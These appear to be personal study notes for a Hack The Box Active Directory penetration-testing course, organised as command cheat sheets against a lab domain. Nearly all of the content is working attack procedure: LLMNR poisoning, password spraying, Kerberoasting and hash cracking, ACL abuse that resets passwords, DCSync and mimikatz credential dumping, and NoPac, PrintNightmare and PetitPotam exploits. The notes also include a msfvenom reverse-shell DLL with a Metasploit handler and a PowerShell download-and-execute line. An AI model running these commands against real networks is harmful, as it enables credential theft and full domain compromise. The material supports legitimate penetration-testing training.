The big question:
- How does this fit in the web attack/network attack chain (i.e make progress)? And what are the conditions (things that needs to be done before hand) before executing it.
- E.g. What domain user is explicitly listed as a member of the local Administrators group on the target host?
	- We can target domain users for local administrator access -> credential hunting on this target host. 
- Ask ourselves big questions through:
	- Questions at end of module
	- Skill assessment
	- Overall section & knowledge walk through. 


## Initial Enumeration

#### External Recon and Enumeration Principles
```
## Example Enumeration Process

- BGB-Toolkit by [Hurricane Electric](http://he.net/)

- [domaintools](https://whois.domaintools.com/), [viewdns.info](https://viewdns.info/)

- SharePoint Administrator job listing

- filetype:pdf inurl:inlanefreight.com

- intext:"@inlanefreight.com" inurl:inlanefreight.com

- E-mail Dork Results

sudo python3 dehashed.py -q inlanefreight.local -p
```

#### Initial Enumeration of the domain
```shell-session
## TTPs
sudo -E wireshark

- Wireshark fliter: arp

- Wireshark fliter: mdns

sudo tcpdump -i ens224 

sudo responder -I ens224 -A 

fping -asgq 172.16.5.0/23

sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
or
sudo nmap -sV -Pn -iL host_alive.txt -oN host_alive_enum
or
sudo nmap -v -Pn -sTV -iL host_alive.txt -oN host_alive_enum

nmap -A 172.16.5.100

## Identifying Users
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

## Sniffing out a Foothold

#### LLMNR/NBT-NS Poisoning - from Linux
```shell-session
## TTPs
responder -h

ls

sudo responder -I ens224 

hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

#### LLMNR/NBT-NS Poisoning - from Windows
```powershell-session
## Using Inveigh
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

## C# Inveigh (InveighZero)
.\Inveigh.exe
- Press <ESC> while running
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
GET NTLMV2UNIQUE
```

## Sighting In, Hunting For a User

#### Password Spraying Overview
```bash
#!/bin/bash

for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```

#### Enumerating & Retrieving Password Policies
```shell-session
## Enumerating the Password Policy - from Linux - Credentialed
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

## Enumerating the Password Policy - from Linux - SMB NULL Sessions
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo

enum4linux -P 172.16.5.5

enum4linux-ng -P 172.16.5.5 -oA ilfreight

cat ilfreight.json 

## Enumerating Null Session - from Windows
C:\htb> net use \\host\ipc$ "" /u:""

C:\htb> net use \\DC01\ipc$ "" /u:guest
C:\htb> net use \\DC01\ipc$ "password" /u:guest
C:\htb> net use \\DC01\ipc$ "password" /u:guest

## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

C:\htb> net accounts


PS C:\htb> import-module .\PowerView.ps1
```

#### Password Spraying - Making a Target User List
```shell-session

## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N 172.16.5.5

crackmapexec smb 172.16.5.5 --users

## Gathering Users with LDAP Anonymous
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

## Enumerating Users with Kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

## Credentialed Enumeration to Build our User List
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## Spray Responsibly

#### Internal Password Spraying - from Linux
```shell-session
## Credentialed Enumeration to Build our User List
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

## Local Administrator Password Reuse
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

#### Internal Password Spraying - from Windows
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Deeper Down the Rabbit Hole
#### Enumerating Security Controls
```powershell-session
PS C:\htb> Get-MpComputerStatus

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PS C:\htb> $ExecutionContext.SessionState.LanguageMode

PS C:\htb> Find-LAPSDelegatedGroups

PS C:\htb> Find-AdmPwdExtendedRights

PS C:\htb> Get-LAPSComputers
```

#### Credentialed Enumeration - from Linux
```shell-session
## CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 

## SMBMap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

## rpcclient
rpcclient -U "" -N 172.16.5.5


rpcclient $> queryuser 0x457


rpcclient $> enumdomusers

## Impacket Toolkit
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  

wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

## Windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

## Bloodhound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
ls
zip -r ilfreight_bh.zip *.json
- Uploading Zip file to BH

- -> BH GUI -> Analysis -> Shortest Path to Domain Admin

// Skills extra
-> BH GUI -> search for interns@inlanefreight.local -> obtain info about the group
```

#### Credentialed Enumeration - from Windows
```powershell-session
## ActiveDirectory PowerShell Module
PS C:\htb> Import-Module ActiveDirectory

Note: If can't import doesn't work, we use the following then retry:
Install-WindowsFeature -Name "RSAT-AD-PowerShell"

PS C:\htb> Get-Module

PS C:\htb> Get-ADDomain

PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Credentialed Enumeration - from Linu
PS C:\htb> Get-ADTrust -Filter *

PS C:\htb> Get-ADGroup -Filter * | select name

PS C:\htb> Get-ADGroup -Identity "Backup Operators"

PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

## PowerView
- Powerview: Commands below
```

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

```
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

PS C:\htb> Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

## SharpView
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

## Snaffler
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

## BloodHound
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

#### Living Off the Land
```
## Env Commands For Host & Network Recon
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%

## Harnessing PowerShell
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
Get-ChildItem Env: | ft Key,Value
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"


PS C:\htb> Get-host
PS C:\htb> powershell.exe -version 2
PS C:\htb> get-module

## Checking Defenses
PS C:\htb> netsh advfirewall show allprofiles
C:\htb> sc query windefend

PS C:\htb> Get-MpComputerStatus

## Am I Alone?
PS C:\htb> qwinsta

## Network Information
arp -a
ipconfig /all
route print
netsh advfirewall show state

Note: Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

## Windows Management Instrumentation (WMI)
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list

wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

## Net Commands
- net commands below
```

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

```powershell-session
PS C:\htb> net group /domain

net user /domain wrouse

## Dsquery
PS C:\htb> dsquery user

PS C:\htb> dsquery computer

PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

// Skills extra
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL" | Select-String -Pattern "Domain Admins"
or
dsquery group | Select-String -Pattern "Domain Admins"

dsquery * -filter "&(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)((userAccountControl:1.2.840.113556.1.4.803:=2))" -attr Description
```

## Cooking with Fire
#### Kerberoasting - from Linux
```shell-session
## Kerberoasting with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

#### Kerberoasting - from Windows
```cmd-session
## Kerberoasting - Semi Manual method
C:\htb> setspn.exe -Q */*

PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

.\mimikatz.exe
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  

.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"

echo "<base64 blob>" |  tr -d \\n 
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
cat sqldev_tgs_hashcat 

hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

## Automated / Tool Based Route
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv

PS C:\htb> .\Rubeus.exe kerberoast /stats

PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 

PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 

PS C:\htb>  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

## An ACE in the Hole
#### Access Control List (ACL) Abuse Primer
```
- Viewing forend's ACL through Active Directory Users & Computers
- Viewing the SACLs through the Auditing Tab ``

- Viewing Permissions ``
```

#### ACL Enumeration
```
## Enumerating ACLs with PowerView
PS C:\htb> Find-InterestingDomainAcl

PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley

PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

## Enumerating ACLs with BloodHound
- BH GUI -> WLEY in node info -> transitive object control

- Investigating ForceChangePasswordFurther

- Viewing Potential Attack Paths through BloodHound

- Viewing Pre-Build queries through BloodHound

// Skills extra
Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid} 
```

#### ACL Abuse Tactics
```powershell-session
## Abusing ACLs
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

## Cleanup
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```powershell-session
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

#### DCSync
```powershell-session
## validating and performing DCSync
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

ls inlanefreight_hashes*

PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

- Viewing an account with reversible passwors storage set (CORP -> Employees -> Service Accounts -> PROXYAGENT)

PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

cat inlanefreight_hashes.ntds.cleartext 

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell

PS C:\htb> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator" "exit"
```

## Stacking the Deck (Common themes in AD)
#### Privileged Access
```powershell-session
## Remote Desktop
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

- Check Domain Users Group's Local Admin & Execution Rights using BH
(node info -> local admin right -> derivative local admin right)

- Check remote access right using BH
(node info -> execution right)

## WinRM
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

- Add Cypher query (analysis -> custom queries)

PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

evil-winrm (use rvm 3.1.0 if needed)

evil-winrm -i 10.129.201.234 -u forend

## SQL Server Admin
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

mssqlclient.py 

mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

SQL> enable_xp_cmdshell

xp_cmdshell whoami /priv
```

#### Kerberos "Double Hop" Problem
```powershell-session
## Background
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm

## Workaround #1: PSCredential Object
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
	
get-domainuser -spn | select 

C:\htb> klist

## Workaround #2: Register PSSession Configuration
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM

PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
```

#### Bleeding Edge Vulnerabilities
```shell-session
## NoPac (SamAccountName Spoofing)
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

ls

## PrintNightmare
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

## PetitPotam (MS-EFSRPC)
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

python3 PetitPotam.py 172.16.5.225 172.16.5.5     

python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

export KRB5CCNAME=dc01.ccache

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

klist

crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

PS C:\Tools> klist

PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe "lsadump::dcsync /user:inlanefreight\krbtgt" "exit"
```

#### Miscellaneous Misconfigurations
```
- ## Exchange Related Group Membership
- ## PrivExchange

## Printer bug
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

- ## MS14-068

- ## Sniffing LDAP Credentials

## Enumerating DNS Records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
head records.csv 

adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
head records.csv 

## Password in Description Field
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

## PASSWD_NOT_REQD Field
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

## Credentials in SMB Shares and SYSVOL Scripts
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

